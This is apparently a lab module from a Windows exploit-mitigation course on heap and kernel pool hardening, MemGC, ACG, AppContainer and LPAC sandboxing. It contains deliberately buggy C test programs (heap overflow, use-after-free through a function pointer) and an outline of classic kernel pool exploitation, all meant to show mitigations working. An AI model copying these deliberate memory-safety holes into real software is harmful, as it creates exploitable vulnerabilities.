## Day 4: Heap Protections and Memory Integrity

- **Goal**: Understand Windows heap security features and memory protection mechanisms.
- **Activities**:
  - _Reading_:
    - [Heap Security Features](https://learn.microsoft.com/en-us/windows/win32/memory/heap-functions)
    - [Microsoft Edge MemGC Internals](https://hitcon.org/2015/CMT/download/day2-h-r1.pdf)
  - _Online Resources_:
    - [Windows 10 Segment Heap Internals](https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals.pdf)
    - [Windows 10 Nt Heap Exploitation](https://www.slideshare.net/slideshow/windows-10-nt-heap-exploitation-english-version/154467191)
  - _Tool Setup_:
    - WinDbg with heap extensions
    - Application Verifier
  - _Exercise_:
    - Observe heap metadata protections
    - Test heap isolation
    - Verify MemGC enforcement

### Deliverables

- **PageHeap Log**: WinDbg output showing immediate detection of heap overflow
- **AppVerifier Report**: Screenshot of AppVerifier catching the UAF
- **Analysis**: Brief explanation of how Segment Heap differs from NT Heap in mitigation checks

### Kernel Pool Hardening

Before covering user-mode heaps, understand that the kernel has its own pool allocator with significant hardening.

#### Kernel Pool Architecture

**Pool Types**:

Windows Kernel Pool Types

- NonPagedPool (Legacy):
  - Cannot be paged to disk
  - Used for DPC, ISR accessible data
  - DEPRECATED for new code
- NonPagedPoolNx (Windows 8+):
  - Non-paged, Non-executable
  - Default for ExAllocatePool2
  - DEP for kernel heap!
- PagedPool:
  - Can be paged to disk
  - Most kernel allocations
  - Non-executable by default
- NonPagedPoolSession / PagedPoolSession:
  - Per-session pools (win32k)
  - Isolated between sessions

**Pool Hardening Features**:

Windows Pool Protections:

- Pool Header Encoding
  - Metadata XORed with cookie
  - Corruption detected on free
  - Similar to user-mode heap encoding
- Safe Unlinking
  - Validates Flink/Blink pointers
  - Prevents classic unlink exploits
  - Introduced in Vista
- NonPagedPoolNx Default
  - Windows 8+ uses NX pools
  - Kernel shellcode harder to execute
  - Must reuse existing code (ROP)
- Pool Type Separation (Win 10 19H1+)
  - Different types in different regions
  - Prevents type confusion via pool spray
- Special Pool
  - Debug feature for detecting overflows
  - Guard pages around allocations
  - verifier /flags 0x1 /all
- Low Fragmentation Heap in Kernel
  - Segment heap concepts in kernel
  - Randomized allocation order
  - Harder to predict adjacency

**Why Kernel Pool Matters for Exploitation**:

Classic Kernel Pool Exploit:

- Trigger kernel UAF or overflow
- Spray pool with controlled objects
- Corrupt adjacent object's function pointer
- Trigger call to corrupted pointer
- Execute shellcode in NonPagedPool
- With Modern Protections:
  - UAF -> Pool type isolation complicates spraying
  - Overflow -> Safe unlinking detects corruption
  - Corruption -> Encoding detects tampering
  - Shellcode -> NonPagedPoolNx blocks execution
  - Must use data-only attacks or ROP

### Windows Heap Evolution

**Heap Managers**:

- Windows XP/Vista/7/8:
  - NT Heap (Front-End + Back-End)
  - Low Fragmentation Heap (LFH)
  - Lookaside Lists
- Windows 10+:
  - Segment Heap (new default for modern apps)
  - NT Heap (legacy compatibility)
  - Enhanced security features

**NT Heap Protections**:

1. **Safe Unlinking**:

   ```c
   // Validates chunk metadata before unlinking
   // Prevents classic unlink exploits

   if (chunk->flink->blink != chunk ||
       chunk->blink->flink != chunk) {
       // Corruption detected!
       RtlpHeapHandleError();
   }
   ```

2. **Heap Cookie**:

   ```c
   // Similar to stack cookie
   // Stored in heap metadata
   // Checked on free()

   _HEAP_ENTRY {
       WORD Size;
       WORD Flags;
       BYTE SmallTagIndex;
       BYTE Cookie;  // Random per-heap value
       ...
   };
   ```

3. **Encoded Metadata**:

   ```c
   // Heap headers are XORed with encoding key
   // Prevents direct metadata manipulation

   ULONG_PTR encoded_size = actual_size ^ heap->Encoding;
   entry->Size = encoded_size;
   ```

### Testing Heap Protections

**Heap Overflow Detection**:

```c
// heap_overflow.c
#include <windows.h>
#include <stdio.h>
#include <string.h>

int main() {
    HANDLE hHeap = GetProcessHeap();

    // Allocate two adjacent chunks
    char *chunk1 = (char*)HeapAlloc(hHeap, 0, 64);
    char *chunk2 = (char*)HeapAlloc(hHeap, 0, 64);

    printf("[*] Chunk1: %p (64 bytes)\n", chunk1);
    printf("[*] Chunk2: %p (64 bytes)\n", chunk2);
    printf("[*] Gap:    %lld bytes\n", (long long)((char*)chunk2 - (char*)chunk1));
    fflush(stdout);

    // Write valid data
    memcpy(chunk1, "Hello", 6);
    memcpy(chunk2, "World", 6);
    printf("[*] Before overflow: chunk2 = '%s'\n", chunk2);
    fflush(stdout);

    // Overflow: write 128 bytes into 64-byte chunk1
    // This corrupts chunk2's heap metadata (encoded headers)
    printf("[!] Overflowing chunk1 with 128 bytes of 'A'...\n");
    fflush(stdout);
    memset(chunk1, 'A', 128);  // Way beyond 64 bytes!

    // Try to free chunk2 — heap validates encoded metadata
    printf("[*] Attempting HeapFree(chunk2)...\n");
    fflush(stdout);
    HeapFree(hHeap, 0, chunk2);
    // Heap corruption detected -> process terminates

    printf("[-] Should not reach here\n");
    return 0;
}
```

**Compile and Test**:

```bash
# Save to C:\Windows_Mitigations_Lab\src\heap_overflow.c
cd C:\Windows_Mitigations_Lab
cl /Zi src\heap_overflow.c /Fe:bin\heap_overflow.exe /link /DEBUG

# Run normally — may or may not crash depending on heap layout
.\bin\heap_overflow.exe
# If adjacent: crash on HeapFree with STATUS_HEAP_CORRUPTION (0xC0000374)
# If not adjacent: corruption may go undetected!

# Enable Page Heap for GUARANTEED detection:
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /enable bin\heap_overflow.exe /full
.\bin\heap_overflow.exe
# Now: immediate access violation when writing past chunk1's boundary
# Exit code: 0xC0000005 (STATUS_ACCESS_VIOLATION) — guard page hit

# Disable Page Heap when done:
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /disable bin\heap_overflow.exe
```

**Viewing in WinDbg**:

```bash
windbg bin\heap_overflow.exe

# Enable Page Heap for detailed detection

# Run again
g

# Crash will provide detailed heap corruption info
!analyze -v
# Shows exactly which heap check failed
```

### Segment Heap

**What is Segment Heap?**:

- New heap allocator in Windows 10+
- Default for UWP and modern apps
- Enhanced security features
- Better performance for modern workloads

**Key Features**:

1. **Segment-based Allocation**:

   ```text
   Small allocations (<128KB): Use segments
   Large allocations: Direct VirtualAlloc

   Segments organized by size classes
   Reduces fragmentation
   ```

2. **Guard Pages**:

   ```text
   [Segment] [Guard Page] [Segment] [Guard Page]

   Guard pages detect:
   - Linear overflows between segments
   - Use-after-free (pages decommitted)
   ```

3. **Randomization**:
   ```text
   - Allocation order randomized
   - Metadata location randomized
   - Makes heap spraying harder
   ```

**Testing Segment Heap**:

```c
// segment_heap_test.c
#include <windows.h>
#include <stdio.h>

// Note: Segment Heap is enabled automatically for:
// - UWP apps
// - Apps with "SegmentHeap" in manifest
// - System processes on Windows 10 2004+

int main() {
    HANDLE hHeap;

    // Default heap creation - system decides based on app configuration
    // On modern Windows with proper manifest, this uses Segment Heap
    hHeap = HeapCreate(0, 0, 0);

    if (!hHeap) {
        printf("Failed to create segment heap\n");
        return 1;
    }

    printf("Segment heap created: %p\n", hHeap);

    // Allocate from segment heap
    for (int i = 0; i < 100; i++) {
        void *p = HeapAlloc(hHeap, 0, 64);
        printf("Allocation %d: %p\n", i, p);
    }

    HeapDestroy(hHeap);
    return 0;
}
```

**Compile and Run**:

```bash
# Save to src\segment_heap_test.c
cl /Zi src\segment_heap_test.c /Fe:bin\segment_heap_test.exe /link /DEBUG

# Run the test
.\bin\segment_heap_test.exe
```

**Expected Output**:

```text
Segment heap created: 0000019E62DD0000
Allocation 0: 0000019E62DD0860
Allocation 1: 0000019E62DD08B0
Allocation 2: 0000019E62DD0900
...
Allocation 16: 0000019E62DD0D60
Allocation 17: 0000019E62DD0750  <-- Randomization: address jumped backward!
Allocation 18: 0000019E62DD3770  <-- Randomization: large jump forward
Allocation 19: 0000019E62DD3900
...
Allocation 99: 0000019E62DD4F30
```

> [!NOTE]
> Notice how the allocation addresses jump around (e.g., from `...D60` to `...750` then `...3770`).
> Unlike the NT Heap which typically allocates sequentially, the Segment Heap randomizes
> allocation order within segments to make heap spraying and grooming significantly more difficult.

### MemGC (Memory Garbage Collector)

**What is MemGC?**:

- Temporal memory safety for C++
- Detects use-after-free at runtime
- Used in Microsoft Edge
- Delays memory reuse

**How MemGC Works**:

```c
// Without MemGC:
Object *obj = new Object();
delete obj;         // Memory freed
Object *obj2 = new Object();  // Reuses same memory!
// obj is now dangling pointer

// With MemGC:
Object *obj = new Object();
delete obj;         // Memory marked for reclamation
Object *obj2 = new Object();  // Gets DIFFERENT memory
// Later: GC reclaims obj's memory
// obj dangling pointer points to unmapped memory -> crash
```

**Key Concepts**:

- Delayed Freeing:
  - Free() doesn't immediately return memory
  - Memory held in quarantine
  - Reused only after delay
- Pointer Tracking:
  - Tracks all pointers to allocation
  - Prevents reuse while pointers exist
  - Use-after-free caught when dereferenced
- Scanning:
  - Periodically scans for unreachable allocations
  - Reclaims memory with no live pointers
  - Similar to garbage-collected languages

**Simulating MemGC Behavior**:

Since MemGC is specific to the Edge browser engine (Blink), we cannot directly use it in a standalone C++ application. However, we can **simulate** its strict memory safety guarantees (crashing on use-after-free) using **Page Heap**.

```cpp
// memgc_test.cpp
#include <windows.h>
#include <stdio.h>

struct Object {
    int data;
    void (*callback)();
};

void safe_callback() {
    printf("Safe callback\n");
}

int main() {
    // Allocate object
    Object *obj = new Object();
    obj->data = 42;
    obj->callback = safe_callback;

    // Use it
    obj->callback();  // OK

    // Delete it
    delete obj;

    // UAF attempt
    // Standard Heap: Likely succeeds (memory not cleared immediately)
    // MemGC / Page Heap: Crashes immediately (access violation)
    obj->callback();

    return 0;
}
```

**Compile and Run (Simulation)**:

To see the crash, we must enable Page Heap to force an access violation on the freed memory:

```bash
# Compile
cl /Zi src\memgc_test.cpp /Fe:bin\memgc_test.exe /link /DEBUG

# 1. Run normally (Standard Heap)
.\bin\memgc_test.exe
# Output:
# Safe callback
# Safe callback  <-- UAF succeeds! (Dangerous)

# 2. Enable Page Heap (Simulates MemGC strictness)
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /enable bin\memgc_test.exe /full

# 3. Run again
.\bin\memgc_test.exe
# Output:
# Safe callback
# (Crash / Silence) <-- UAF caught!

# Cleanup
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /disable bin\memgc_test.exe
```

**Limitations**:

- Performance overhead (10-15%)
- Not available for all applications
- Transparent to application code (no source changes needed — it hooks the allocator)
- Works with both C and C++ allocations (any `malloc`/`free` or `new`/`delete`)

### Arbitrary Code Guard (ACG)

**What is ACG?**:

- Prevents dynamic code generation and modification
- Makes code pages immutable after loading
- Blocks: VirtualAlloc(RWX), VirtualProtect(RWX), shellcode injection
- Used by Microsoft Edge and other security-sensitive apps

**How ACG Works**:

- Without ACG:
  - Process can allocate RWX memory
  - Process can change RW -> RWX
  - Shellcode injection possible
- With ACG:
  - VirtualAlloc with EXECUTE fails
  - VirtualProtect to add EXECUTE fails
  - Only signed, loaded code can execute

**Testing ACG**:

```c
// acg_test.c - This will fail with ACG enabled
#include <windows.h>
#include <stdio.h>

int main() {
    // Try to allocate executable memory
    void *mem = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (mem == NULL) {
        printf("ACG blocked VirtualAlloc RWX! Error: %d\n", GetLastError());
        return 1;
    }
    printf("Allocated RWX memory at %p\n", mem);
    return 0;
}
```

**Compile and Run**:

```bash
# Compile
cl /Zi src\acg_test.c /Fe:bin\acg_test.exe /link /DEBUG

# Run without ACG
.\bin\acg_test.exe
# Output:
# Allocated RWX memory at 00000210A61B0000

# Enable ACG for this app(powershell admin)
Set-ProcessMitigation -Name "C:\Windows_Mitigations_Lab\bin\acg_test.exe" -Enable BlockDynamicCode

# Run with ACG
.\bin\acg_test.exe
# Output:
# ACG blocked VirtualAlloc RWX! Error: 1655

# Disable ACG
Set-ProcessMitigation -Name "C:\Windows_Mitigations_Lab\bin\acg_test.exe" -Disable BlockDynamicCode
```

### Code Integrity Guard (CIG)

**What is CIG?**:

- Only allows Microsoft-signed or WHQL-signed binaries to load
- Prevents loading of unsigned DLLs
- Blocks DLL injection attacks

**ACG + CIG Combined**:

- ACG: No new executable code
- CIG: Only signed code loads
- Together: Very strong code execution prevention

### Application Verifier

**What is Application Verifier?**:

- Runtime verification tool from Microsoft
- Detects memory corruption, handle leaks, etc.
- More aggressive than normal heap checks
- Essential for testing

**What It Detects**:

- Heap corruption
- Buffer overflows
- Use-after-free
- Double-free
- Handle leaks
- Lock violations
- DLL load issues

**Example**:

```c
// heap_uaf.c
#include <windows.h>
#include <stdio.h>
#include <string.h>

int main() {
    HANDLE hHeap = GetProcessHeap();

    char *p = (char*)HeapAlloc(hHeap, 0, 100);
    strcpy(p, "Hello from allocated memory");
    printf("[*] Allocated: %p, content: '%s'\n", p, p);
    fflush(stdout);

    HeapFree(hHeap, 0, p);
    printf("[*] Freed %p\n", p);
    fflush(stdout);

    // UAF: access after free
    // Without AppVerifier: may print stale data or garbage
    //   (memory not yet reclaimed -> no crash!)
    // With AppVerifier: IMMEDIATE access violation on the read
    printf("[!] UAF read: '%s'\n", p);
    fflush(stdout);

    // Second UAF: write after free
    strcpy(p, "CORRUPTED");
    printf("[!] UAF write succeeded (no AppVerifier)\n");
    fflush(stdout);

    return 0;
}
```

```bash
# Compile
cd C:\Windows_Mitigations_Lab
cl /Zi src\heap_uaf.c /Fe:bin\heap_uaf.exe /link /DEBUG

# Run WITHOUT AppVerifier — UAF likely succeeds silently!
.\bin\heap_uaf.exe
# Output: [*] Allocated: ..., content: 'Hello from allocated memory'
# Output: [*] Freed ...
# Output: [!] UAF read: 'Çùα╢Z'  (garbage/stale data!)
# Output: [!] UAF write succeeded (no AppVerifier)
# Exit code: 0x0 — no crash, no detection!

# Enable AppVerifier — UAF caught immediately
appverif -enable Heaps -for bin\heap_uaf.exe
.\bin\heap_uaf.exe
# Output: [*] Allocated: ..., content: 'Hello from allocated memory'
# Output: [*] Freed ...
# Program terminates silently — AppVerifier caught the UAF!
# Exit code: Non-zero (process terminated by AppVerifier)
# AppVerifier places guard pages on freed allocations

# Disable AppVerifier when done:
appverif -disable Heaps -for bin\heap_uaf.exe
```

### Process Isolation and Sandboxing

Windows provides several isolation mechanisms beyond memory protections.

#### AppContainer

**What is AppContainer?**:

- Lightweight sandbox for UWP and modern applications
- Restricts network, filesystem, and registry access
- Token-based capability model
- Default for Microsoft Store apps and Edge

**AppContainer Architecture**:

```text
Traditional Win32 App:              AppContainer App:
---------------------------------------------------------------

┌────────────────────────┐         ┌────────────────────────┐
│ Admin/User Token       │         │ AppContainer Token     │
│ - Full user rights     │         │ - Restricted rights    │
│ - Access to profile    │         │ - Limited capabilities │
│ - Network access       │         │ - Isolated namespace   │
└────────────────────────┘         └────────────────────────┘
        │                                    │
        ▼                                    ▼
┌────────────────────────┐         ┌────────────────────────┐
│ File System            │         │ Virtualized FS         │
│ - C:\Users\...         │         │ - AppData\Local\       │
│ - Any location         │         │   Packages\<AppName>   │
└────────────────────────┘         └────────────────────────┘
        │                                    │
        ▼                                    ▼
┌────────────────────────┐         ┌────────────────────────┐
│ Registry               │         │ Virtualized Registry   │
│ - HKCU, HKLM           │         │ - Package-specific     │
└────────────────────────┘         └────────────────────────┘
```

**AppContainer Capabilities**:

```xml
<!-- Package.appxmanifest capabilities -->
<Capabilities>
    <Capability Name="internetClient"/>      <!-- Outbound internet -->
    <Capability Name="privateNetworkClientServer"/>  <!-- Local network -->
    <Capability Name="documentsLibrary"/>    <!-- Documents folder -->
    <Capability Name="webcam"/>              <!-- Camera access -->
    <Capability Name="microphone"/>          <!-- Microphone access -->
    <!-- Each capability must be explicitly declared -->
</Capabilities>
```

**Checking AppContainer Status**:

```powershell
# src\appcontainer-demo.ps1
Write-Host "`n=== AppContainer Security Demo ===" -ForegroundColor Cyan
Write-Host "Lightweight sandbox for UWP and modern apps`n"

# 1. List AppContainer Packages
Write-Host "[1] AppContainer Packages on System" -ForegroundColor Yellow
Get-AppxPackage | Select-Object -First 5 Name, PackageFamilyName | Format-Table

# 2. Show Filesystem Isolation
Write-Host "`n[2] Filesystem Isolation" -ForegroundColor Yellow
$packagesPath = "$env:LOCALAPPDATA\Packages"
Write-Host "Isolated storage: $packagesPath`n"
Get-ChildItem $packagesPath -Directory | Select-Object -First 3 | ForEach-Object {
    Write-Host "  $($_.Name)" -ForegroundColor Cyan
    Get-ChildItem $_.FullName -Directory -ErrorAction SilentlyContinue | Select-Object -First 3 | ForEach-Object {
        Write-Host "    /$($_.Name)"
    }
}

# 3. Network Capabilities
Write-Host "`n[3] Network Capabilities Required" -ForegroundColor Yellow
Write-Host "  internetClient - Outbound internet"
Write-Host "  privateNetworkClientServer - Local network"
Write-Host "  Apps must declare these in manifest"

# 4. Check Edge Process
Write-Host "`n[4] Edge Process Check" -ForegroundColor Yellow
$edge = Get-Process msedge -ErrorAction SilentlyContinue | Select-Object -First 1
if ($edge) {
    Write-Host "  PID: $($edge.Id)"
    Write-Host "  Path: $($edge.Path)"
    Write-Host "  Memory: $([math]::Round($edge.WorkingSet64/1MB, 2)) MB"
} else {
    Write-Host "  Edge not running - start it to test"
}

# 5. Security Summary
Write-Host "`n[5] AppContainer Restrictions" -ForegroundColor Yellow
Write-Host "  [+] Isolated filesystem (per-app folders)"
Write-Host "  [+] Virtualized registry"
Write-Host "  [+] Network capability model"
Write-Host "  [+] Cannot inject into other processes"
Write-Host "  [+] Low-privilege token (S-1-15-2-*)"

Write-Host "`n=== Complete ===" -ForegroundColor Green
```

**AppContainer Security Boundaries**:

- What AppContainer Restricts:
  - File System
    - Cannot read outside package folder
    - Cannot write to system locations
    - Broker process mediates file access
  - Registry
    - Isolated registry hive
    - Cannot modify HKLM
    - Cannot read other users' HKCU
  - Network
    - Requires explicit capability
    - Cannot bind to all interfaces
    - Loopback blocked by default
  - Process
    - Cannot inject into other processes
    - Cannot open handles to non-AC processes
    - Limited debugging rights
  - Kernel Objects
    - Cannot create global objects
    - Named objects scoped to container

**Compile and Run**

```bash
cd C:\Windows_Mitigations_Lab
Set-ExecutionPolicy Bypass -Scope Process -Force
.\src\appcontainer-demo.ps1
```

#### LPAC (Less Privileged AppContainer)

**What is LPAC?**:

- "Less Privileged App Container" - Enhanced AppContainer
- Even more restricted than standard AppContainer
- Used by browser content processes (Chrome, Edge)
- Blocks many Windows subsystem APIs

**LPAC vs AppContainer**:

```text
Standard AppContainer:              LPAC:
-------------------------------------------------------------------

Win32k Access: Limited              Win32k Access: Blocked
- Can create windows                - No window creation
- Some GDI operations               - No GDI access
                                    - Uses GPU process for display

COM Activation: Allowed             COM Activation: Blocked
- Can activate COM servers          - No COM activation
- OLE Automation works              - Must use IPC to broker

Networking: Capability-based        Networking: More restricted
- Full sockets with capability      - Limited socket operations
                                    - DNS through broker

Use Case: Store apps, Edge UI       Use Case: Renderer processes
```

**Verify LPAC Process**:

```c
// verify_lpac.c - Check if a process is running in LPAC/AppContainer
// Compile: cl /Zi /W4 src\verify_lpac.c /Fe:bin\verify_lpac.exe /link advapi32.lib

#include <windows.h>
#include <stdio.h>
#include <sddl.h>

#pragma comment(lib, "advapi32.lib")

void CheckProcessAppContainer(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        printf("Failed to open process %d: %d\n", pid, GetLastError());
        return;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        printf("Failed to open process token: %d\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    // Check if process is in AppContainer
    DWORD isAppContainer = 0;
    DWORD returnLength;

    printf("=== Process %d Security Analysis ===\n\n", pid);

    if (GetTokenInformation(hToken, TokenIsAppContainer,
                           &isAppContainer, sizeof(isAppContainer),
                           &returnLength)) {
        printf("AppContainer Status:\n");
        printf("  IsAppContainer: %s\n", isAppContainer ? "YES" : "NO");

        if (isAppContainer) {
            // Get AppContainer SID
            DWORD sidLength = 0;
            GetTokenInformation(hToken, TokenAppContainerSid, NULL, 0, &sidLength);

            if (sidLength > 0) {
                PTOKEN_APPCONTAINER_INFORMATION appContainerInfo =
                    (PTOKEN_APPCONTAINER_INFORMATION)malloc(sidLength);

                if (GetTokenInformation(hToken, TokenAppContainerSid,
                                       appContainerInfo, sidLength, &returnLength)) {
                    LPWSTR sidString;
                    if (ConvertSidToStringSidW(appContainerInfo->TokenAppContainer, &sidString)) {
                        wprintf(L"  AppContainer SID: %s\n", sidString);
                        LocalFree(sidString);
                    }
                }
                free(appContainerInfo);
            }

            // Check for LPAC (Less Privileged AppContainer)
            // TokenIsLessPrivilegedAppContainer = 77 (Windows 10 1809+)
            DWORD isLPAC = 0;
            if (GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)77,
                                   &isLPAC, sizeof(isLPAC), &returnLength)) {
                printf("  IsLPAC: %s\n", isLPAC ? "YES" : "NO");
            } else {
                printf("  IsLPAC: Unable to query (error %d, may require Windows 10 1809+)\n",
                       GetLastError());
            }

            // Get capabilities
            DWORD capLength = 0;
            GetTokenInformation(hToken, TokenCapabilities, NULL, 0, &capLength);

            if (capLength > 0) {
                PTOKEN_GROUPS capabilities = (PTOKEN_GROUPS)malloc(capLength);

                if (GetTokenInformation(hToken, TokenCapabilities,
                                       capabilities, capLength, &returnLength)) {
                    printf("  Capabilities: %d\n", capabilities->GroupCount);

                    if (capabilities->GroupCount > 0) {
                        printf("\n  Capability SIDs:\n");
                        for (DWORD i = 0; i < capabilities->GroupCount; i++) {
                            LPWSTR capSidString;
                            if (ConvertSidToStringSidW(capabilities->Groups[i].Sid, &capSidString)) {
                                wprintf(L"    [%d] %s\n", i, capSidString);
                                LocalFree(capSidString);
                            }
                        }
                    }
                }
                free(capabilities);
            }
        }
    } else {
        printf("Failed to query TokenIsAppContainer: %d\n", GetLastError());
    }

    // Check integrity level
    printf("\nIntegrity Level:\n");
    DWORD integrityLength = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &integrityLength);

    if (integrityLength > 0) {
        PTOKEN_MANDATORY_LABEL integrityLabel = (PTOKEN_MANDATORY_LABEL)malloc(integrityLength);

        if (GetTokenInformation(hToken, TokenIntegrityLevel,
                               integrityLabel, integrityLength, &returnLength)) {
            DWORD integrityLevel = *GetSidSubAuthority(integrityLabel->Label.Sid,
                                   *GetSidSubAuthorityCount(integrityLabel->Label.Sid) - 1);

            const char* levelName;
            if (integrityLevel < SECURITY_MANDATORY_LOW_RID) {
                levelName = "Untrusted";
            } else if (integrityLevel < SECURITY_MANDATORY_MEDIUM_RID) {
                levelName = "Low";
            } else if (integrityLevel < SECURITY_MANDATORY_HIGH_RID) {
                levelName = "Medium";
            } else if (integrityLevel < SECURITY_MANDATORY_SYSTEM_RID) {
                levelName = "High";
            } else {
                levelName = "System";
            }

            printf("  Level: %s (0x%X)\n", levelName, integrityLevel);
        }
        free(integrityLabel);
    }

    // Check if elevated
    TOKEN_ELEVATION elevation;
    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &returnLength)) {
        printf("  Elevated: %s\n", elevation.TokenIsElevated ? "YES" : "NO");
    }

    CloseHandle(hToken);
    CloseHandle(hProcess);

    printf("\n");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: verify_lpac.exe <PID>\n");
        printf("Example: verify_lpac.exe 1234\n");
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    CheckProcessAppContainer(pid);

    return 0;
}
```

```c
// test_lpac_wrapper.c - Launches LPAC process and displays its PID
// Compile: cl /Zi /W4 src\test_lpac_wrapper.c /Fe:bin\test_lpac_wrapper.exe /link advapi32.lib userenv.lib

#include <windows.h>
#include <userenv.h>
#include <sddl.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "userenv.lib")

BOOL CreateLPACProcessNoWait(LPCWSTR cmdLine, LPCWSTR lpacName, DWORD* outPid) {
    PSID lpacSid = NULL;
    LPPROC_THREAD_ATTRIBUTE_LIST attrList = NULL;
    STARTUPINFOEXW si = {0};
    PROCESS_INFORMATION pi = {0};
    SIZE_T attrSize = 0;
    BOOL success = FALSE;
    DWORD allPackagesPolicy = PROCESS_CREATION_ALL_APPLICATION_PACKAGES_OPT_OUT;

    HRESULT hr = CreateAppContainerProfile(
        lpacName, lpacName, L"LPAC Test Container",
        NULL, 0, &lpacSid
    );

    if (FAILED(hr) && hr != HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)) {
        wprintf(L"CreateAppContainerProfile failed: 0x%08X\n", hr);
        goto cleanup;
    }

    if (hr == HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)) {
        hr = DeriveAppContainerSidFromAppContainerName(lpacName, &lpacSid);
        if (FAILED(hr)) {
            wprintf(L"DeriveAppContainerSidFromAppContainerName failed: 0x%08X\n", hr);
            goto cleanup;
        }
    }

    SECURITY_CAPABILITIES secCaps = {0};
    secCaps.AppContainerSid = lpacSid;
    secCaps.Capabilities = NULL;
    secCaps.CapabilityCount = 0;
    secCaps.Reserved = 0;

    InitializeProcThreadAttributeList(NULL, 2, 0, &attrSize);
    attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);

    if (!attrList || !InitializeProcThreadAttributeList(attrList, 2, 0, &attrSize)) {
        wprintf(L"Failed to initialize attribute list\n");
        goto cleanup;
    }

    UpdateProcThreadAttribute(attrList, 0,
        PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES,
        &secCaps, sizeof(secCaps), NULL, NULL);

    UpdateProcThreadAttribute(attrList, 0,
        PROC_THREAD_ATTRIBUTE_ALL_APPLICATION_PACKAGES_POLICY,
        &allPackagesPolicy, sizeof(allPackagesPolicy), NULL, NULL);

    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    si.lpAttributeList = attrList;

    if (!CreateProcessW(NULL, (LPWSTR)cmdLine, NULL, NULL, FALSE,
                       EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
                       NULL, NULL, &si.StartupInfo, &pi)) {
        wprintf(L"CreateProcess failed: %d\n", GetLastError());
        goto cleanup;
    }

    wprintf(L"LPAC process created!\n");
    wprintf(L"  PID: %d\n", pi.dwProcessId);
    wprintf(L"  TID: %d\n\n", pi.dwThreadId);
    wprintf(L"Process is running. Verify with:\n");
    wprintf(L"  .\\bin\\verify_lpac.exe %d\n\n", pi.dwProcessId);
    wprintf(L"Press Enter to terminate the process...\n");

    *outPid = pi.dwProcessId;
    success = TRUE;

    getchar();

    TerminateProcess(pi.hProcess, 0);

cleanup:
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    if (attrList) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList);
    }
    if (lpacSid) FreeSid(lpacSid);

    return success;
}

int wmain(int argc, wchar_t* argv[]) {
    DWORD pid = 0;

    wprintf(L"=== LPAC Process Test Wrapper ===\n\n");

    if (!CreateLPACProcessNoWait(L"cmd.exe /c timeout /t 300", L"TestLPAC", &pid)) {
        wprintf(L"Failed to create LPAC process\n");
        return 1;
    }

    return 0;
}
```

**Testing with Verification Tool**:

```bash
# Compile the verification tool
cl /Zi /W4 src\verify_lpac.c /Fe:bin\verify_lpac.exe /link advapi32.lib
cl /Zi /W4 src\test_lpac_wrapper.c /Fe:bin\test_lpac_wrapper.exe /link advapi32.lib userenv.lib

# Method 1: Start LPAC process and verify immediately
# Open two terminals:

# Terminal 1: Start a long-running LPAC process
.\bin\test_lpac_wrapper.exe
#=== LPAC Process Test Wrapper ===
#LPAC process created!
#  PID: 7436
#  TID: 4604
#Process is running. Verify with:
#  .\bin\verify_lpac.exe 7436
#Press Enter to terminate the process...

# Terminal 2: While it's running, find and verify the process
.\bin\verify_lpac.exe 7436
#=== Process 7436 Security Analysis ===
#AppContainer Status:
#  IsAppContainer: YES
#  AppContainer SID: S-1-15-2-934039966-986718514-2141559622-437351596-127579802-3278121308-378560344
#  IsLPAC: Unable to query (error 87, may require Windows 10 1809+)
#  Capabilities: 0
#Integrity Level:
#  Level: Low (0x1000)
#  Elevated: NO

.\bin\verify_lpac.exe $PID
#=== Process 4424 Security Analysis ===
#AppContainer Status:
#  IsAppContainer: NO
#Integrity Level:
#  Level: Medium (0x2000)
#  Elevated: NO
```

**Key Observations**:

- LPAC process runs at Low integrity (0x1000) vs Medium (0x2000)
- Zero capabilities = maximum restriction
- AppContainer SID uniquely identifies the sandbox
- Normal processes have no AppContainer isolation

#### Win32k Filtering (Win32k Lockdown)

**What is Win32k Filtering?**:

- Blocks access to win32k.sys from sandboxed processes
- win32k.sys is a major kernel attack surface
- Used by Chrome, Edge, Firefox renderers

**Why Block Win32k?**:

```text
win32k.sys Attack Surface:
--------------------------------------------------------

- ~1200 syscalls (NtUser*, NtGdi*)
- Complex state machine (windows, menus, hooks)
- Historical source of many kernel vulns
- 2015-2024: 100+ win32k CVEs

Browser Renderer:
- Doesn't need to create windows (compositor does that)
- Doesn't need GDI (uses GPU)
- Blocking win32k removes huge attack surface
```

**Win32k Filter Impact**:

```text
With Win32k Filtering Enabled:
----------------------------------------------
Process CANNOT:
- Create or manipulate windows
- Use GDI drawing functions
- Set Windows hooks
- Access clipboard directly
- Use USER32/GDI32 APIs

Process MUST:
- Use IPC to broker process for UI
- Use Mojo/IPC for compositor
- Render to shared memory/GPU

Security Benefit:
- 1200+ syscalls removed from attack surface
- win32k kernel exploits don't work
- Only syscall filtering in ntoskrnl matters
```

#### Process Mitigation Policy Summary

